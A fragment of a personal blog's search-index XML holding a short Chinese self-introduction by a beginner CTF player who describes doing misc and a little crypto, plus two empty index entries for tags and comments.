        <content type="html"><![CDATA[<p>Welcome to my site, everybodyyyyy!</p><p>我是St4rr，一个刚刚入门的网安新手。最近在<del>当一个赛棍</del>打CTF，目前是X1cT34m和Polaris的一个misc手，也稍微（真的很稍微！）懂一点点crypto。希望未来能再了解点web，对web真的是一窍不通。。。</p><p>虽然现在还是一个real vegetable，但是有句老话说的好，菜就多练。。。现阶段想先多参加点比赛，并多向师傅们学习，争取多练点技术出来吧。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Comment</title>
      <link href="/comment/index.html"/>
      <url>/comment/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
